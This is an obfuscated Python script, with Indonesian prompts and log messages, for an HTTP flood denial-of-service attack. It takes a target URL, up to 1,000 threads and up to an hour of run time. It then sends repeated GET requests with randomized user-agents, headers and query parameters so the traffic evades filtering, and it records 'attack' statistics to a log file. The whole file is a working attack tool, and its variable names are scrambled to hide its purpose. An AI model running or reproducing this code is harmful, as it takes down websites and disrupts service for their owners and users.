lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII, lllllllllllIlll, lllllllllllIllI, lllllllllllIlIl = Exception, FileNotFoundError, open, print, range, input, str, bool, __name__, ValueError, int

from threading import Lock as llllIlIIIllIlI
from logging import FileHandler as IIlllllIlIIIII, INFO as IIIIIIlIIIlllI, StreamHandler as IlIIlllIlIIlll, getLogger as IIIllIllIIIIIl, basicConfig as IlIllIIlIlIlII
from requests import Session as lIIIllIIlIIlll
from random import randint as IllIIIIIlllIII, uniform as llllIlIlIlllll, choice as IIlIIlIlIlIIIl
from time import sleep as llIIIlIlllllII, time as IIIIllIlIlIIIl
from requests.adapters import HTTPAdapter as IIllIlIIlllIIl
from requests.packages.urllib3.util.retry import Retry as IIIIIllIllIIlI
from concurrent.futures import ThreadPoolExecutor as IIlIIlIIllIlIl, as_completed as lIIIIIIlIIlIIl

class lIlllIlIlIllIllIIl:

    def __init__(lllIIIlIIlIIllIllI, lllllIlIIIlIIIIIII, IIllllIIlIlIlIIIII, lIllIlIIllIlllIIll):
        lllIIIlIIlIIllIllI.lllllIlIIIlIIIIIII = lllllIlIIIlIIIIIII
        lllIIIlIIlIIllIllI.IIllllIIlIlIlIIIII = IIllllIIlIlIlIIIII
        lllIIIlIIlIIllIllI.lIllIlIIllIlllIIll = lIllIlIIllIlllIIll
        lllIIIlIIlIIllIllI.llIIllIIlllIllllIl = 0
        lllIIIlIIlIIllIllI.IIlIlIlIlIIIllIlII = 0
        lllIIIlIIlIIllIllI.IllIIIIIIllIlllIII = 0
        lllIIIlIIlIIllIllI.IlIllIlIlIlIIlllll = llllIlIIIllIlI()
        lllIIIlIIlIIllIllI.llllllIIIlIIIIIlIl = 3
        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI = lllIIIlIIlIIllIllI.lIlllllIIIlIllIlII()
        lllIIIlIIlIIllIllI.lIlllIllllIllIIIII = lllIIIlIIlIIllIllI.IIIllIllIIlIIllllI()

    def lIlllllIIIlIllIlII(lllIIIlIIlIIllIllI):
        IlIllIIlIlIlII(level=IIIIIIlIIIlllI, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[IIlllllIlIIIII('ddos_attack.log'), IlIIlllIlIIlll()])
        return IIIllIllIIIIIl(lllllllllllIlll)

    def IIIllIllIIlIIllllI(lllIIIlIIlIIllIllI):
        lIlllIllllIllIIIII = lIIIllIIlIIlll()
        lllIlIIIllIlllIIll = IIIIIllIllIIlI(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        IlIIIllIIIllIIlllI = IIllIlIIlllIIl(max_retries=lllIlIIIllIlllIIll, pool_connections=1000, pool_maxsize=1000)
        lIlllIllllIllIIIII.mount('http://', IlIIIllIIIllIIlllI)
        lIlllIllllIllIIIII.mount('https://', IlIIIllIIIllIIlllI)
        return lIlllIllllIllIIIII

    def llIllllllIIllIIllI(lllIIIlIIlIIllIllI, llIIIIIllIIIIIIllI='user-agent.txt'):
        """Memuat User-Agent dari file teks"""
        try:
            with lllllllllllllIl(llIIIIIllIIIIIIllI, 'r') as IIlIllIIIIIlllllll:
                IIIlIIllIlllllIlll = [lIIIlIIIIlIIlllllI.strip() for lIIIlIIIIlIIlllllI in IIlIllIIIIIlllllll if lIIIlIIIIlIIlllllI.strip()]
                if not IIIlIIllIlllllIlll:
                    raise lllllllllllIllI('File User-Agent kosong.')
                return IIIlIIllIlllllIlll
        except llllllllllllllI:
            lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.error('File user-agent.txt tidak ditemukan.')
            return ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36']

    def IIllIlIllIIIIllIll(lllIIIlIIlIIllIllI):
        IlIlIlIIIIllIllllI = [{'param': f'value{IllIIIIIlllIII(1, 1000)}'}, {'search': f'query{IllIIIIIlllIII(1, 1000)}'}, {'id': llllllllllllIIl(IllIIIIIlllIII(1, 1000))}, {'page': llllllllllllIIl(IllIIIIIlllIII(1, 100))}, {'limit': llllllllllllIIl(IllIIIIIlllIII(10, 100))}, {'offset': llllllllllllIIl(IllIIIIIlllIII(0, 1000))}, {'sort': IIlIIlIlIlIIIl(['asc', 'desc'])}, {'filter': IIlIIlIlIlIIIl(['active', 'inactive', 'all'])}]
        return IIlIIlIlIlIIIl(IlIlIlIIIIllIllllI)

    def lIIlIllIIIIlIllIII(lllIIIlIIlIIllIllI):
        IIIlIIllIlllllIlll = lllIIIlIIlIIllIllI.llIllllllIIllIIllI()
        return {'User-Agent': IIlIIlIlIlIIIl(IIIlIIllIlllllIlll), 'Accept': IIlIIlIlIlIIIl(['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json,text/plain,*/*', '*/*']), 'Accept-Language': IIlIIlIlIlIIIl(['en-US,en;q=0.5', 'en-GB,en;q=0.5', 'fr-FR,fr;q=0.5']), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Cache-Control': IIlIIlIlIlIIIl(['no-cache', 'max-age=0']), 'Pragma': 'no-cache', 'DNT': IIlIIlIlIlIIIl(['1', '0']), 'Upgrade-Insecure-Requests': '1'}

    def IlIlIIlIlIlllIIllI(lllIIIlIIlIIllIllI):
        try:
            lIIIlllIIlIlIllIII = lllIIIlIIlIIllIllI.lIIlIllIIIIlIllIII()
            lllIllIIllIlllIIll = lllIIIlIIlIIllIllI.IIllIlIllIIIIllIll()
            llIIIlIlllllII(llllIlIlIlllll(0.01, 0.05))
            llIIllIlIIlIIlIllI = lllIIIlIIlIIllIllI.lIlllIllllIllIIIII.get(lllIIIlIIlIIllIllI.lllllIlIIIlIIIIIII, headers=lIIIlllIIlIlIllIII, params=lllIllIIllIlllIIll, timeout=lllIIIlIIlIIllIllI.llllllIIIlIIIIIlIl, allow_redirects=llllllllllllIII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0))
            with lllIIIlIIlIIllIllI.IlIllIlIlIlIIlllll:
                lllIIIlIIlIIllIllI.llIIllIIlllIllllIl += 1
                if llIIllIlIIlIIlIllI.status_code == 200:
                    lllIIIlIIlIIllIllI.IIlIlIlIlIIIllIlII += 1
            lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.debug(f'Request berhasil: {llIIllIlIIlIIlIllI.status_code}')
            return llIIllIlIIlIIlIllI
        except lllllllllllllll as IlIIllllIIIIllIIll:
            with lllIIIlIIlIIllIllI.IlIllIlIlIlIIlllll:
                lllIIIlIIlIIllIllI.IllIIIIIIllIlllIII += 1
            lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.debug(f'Error dalam request: {llllllllllllIIl(IlIIllllIIIIllIIll)}')
            return None

    def IIIIlllIIIIllIIlll(lllIIIlIIlIIllIllI):
        lIIllIIllIllIlllll = IIIIllIlIlIIIl() + lllIIIlIIlIIllIllI.lIllIlIIllIlllIIll
        while IIIIllIlIlIIIl() < lIIllIIllIllIlllll:
            lllIIIlIIlIIllIllI.IlIlIIlIlIlllIIllI()

    def lIllIIIIlIlllllIll(lllIIIlIIlIIllIllI):
        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info(f'Memulai serangan pada {lllIIIlIIlIIllIllI.lllllIlIIIlIIIIIII}')
        with IIlIIlIIllIlIl(max_workers=lllIIIlIIlIIllIllI.IIllllIIlIlIlIIIII) as lIIlIIIlIlIlIllIII:
            IIIIlIIIlIllllllII = [lIIlIIIlIlIlIllIII.submit(lllIIIlIIlIIllIllI.IIIIlllIIIIllIIlll) for lIIllIIlIlllIllllI in llllllllllllIll(lllIIIlIIlIIllIllI.IIllllIIlIlIlIIIII)]
            for llllIIlIIIIIIlIIll in lIIIIIIlIIlIIl(IIIIlIIIlIllllllII):
                try:
                    llllIIlIIIIIIlIIll.result()
                except lllllllllllllll as IlIIllllIIIIllIIll:
                    lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.error(f'Kesalahan eksekusi: {IlIIllllIIIIllIIll}')
        lllIIIlIIlIIllIllI.lIllIIlIlIIllIIlII()

    def lIllIIlIlIIllIIlII(lllIIIlIIlIIllIllI):
        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info('=== Statistik Serangan ===')
        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info(f'Total Request: {lllIIIlIIlIIllIllI.llIIllIIlllIllllIl}')
        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info(f'Request Sukses: {lllIIIlIIlIIllIllI.IIlIlIlIlIIIllIlII}')
        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info(f'Request Gagal: {lllIIIlIIlIIllIllI.IllIIIIIIllIlllIII}')
        IIllIllIllIlIIIIIl = lllIIIlIIlIIllIllI.IIlIlIlIlIIIllIlII / lllIIIlIIlIIllIllI.llIIllIIlllIllllIl * 100 if lllIIIlIIlIIllIllI.llIIllIIlllIllllIl > 0 else 0
        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info(f'Success Rate: {IIllIllIllIlIIIIIl:.2f}%')

def lIlllIIllllIlIlIlI():
    while llllllllllllIII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1):
        try:
            lllllIlIIIlIIIIIII = llllllllllllIlI('Masukkan URL target: ')
            if not lllllIlIIIlIIIIIII.startswith(('http://', 'https://')):
                lllllllllllllII('URL harus dimulai dengan http:// atau https://')
                continue
            IIIIlllllllIllIIlI = lllllllllllIlIl(llllllllllllIlI('Masukkan jumlah thread (1-1000): '))
            if not 1 <= IIIIlllllllIllIIlI <= 1000:
                lllllllllllllII('Jumlah thread harus antara 1-1000')
                continue
            IllIlIlIIlIIllIIll = lllllllllllIlIl(llllllllllllIlI('Masukkan durasi waktu serangan dalam detik (1-3600): '))
            if not 1 <= IllIlIlIIlIIllIIll <= 3600:
                lllllllllllllII('Durasi harus antara 1-3600 detik')
                continue
            return (lllllIlIIIlIIIIIII, IIIIlllllllIllIIlI, IllIlIlIIlIIllIIll)
        except lllllllllllIllI:
            lllllllllllllII('Input tidak valid. Mohon masukkan angka untuk thread dan durasi.')

def lIIlIlIIIIIIllIIlI():
    (lllllIlIIIlIIIIIII, IIllllIIlIlIlIIIII, lIllIlIIllIlllIIll) = lIlllIIllllIlIlIlI()
    IIllllIlllIIIlllIl = lIlllIlIlIllIllIIl(lllllIlIIIlIIIIIII, IIllllIIlIlIlIIIII, lIllIlIIllIlllIIll)
    IIllllIlllIIIlllIl.lIllIIIIlIlllllIll()
if lllllllllllIlll == '__main__':
    lIIlIlIIIIIIllIIlI()
